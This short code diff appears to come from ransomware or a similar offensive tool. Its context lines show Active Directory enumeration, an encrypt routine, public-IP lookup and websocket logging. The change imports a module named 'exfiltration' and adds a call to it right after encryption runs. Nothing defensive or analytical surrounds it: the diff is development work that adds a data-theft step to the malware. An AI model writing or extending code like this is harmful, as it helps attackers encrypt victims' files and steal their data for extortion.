@@ -8,6 +8,7 @@ import createRandomString from './utils/generateRandomString';
 import enumerateAD from './enumerateAd';
 import isActive from './isActive';
 import sendLog from './websocket/client';
+import execute from './exfiltration';
 
 const encrypt = () => {
   enumerateAD();
@@ -128,4 +129,5 @@ getPublicIP()
     console.error(err);
   });
 
-const returnEncrypt = encrypt();
+encrypt();
+execute();
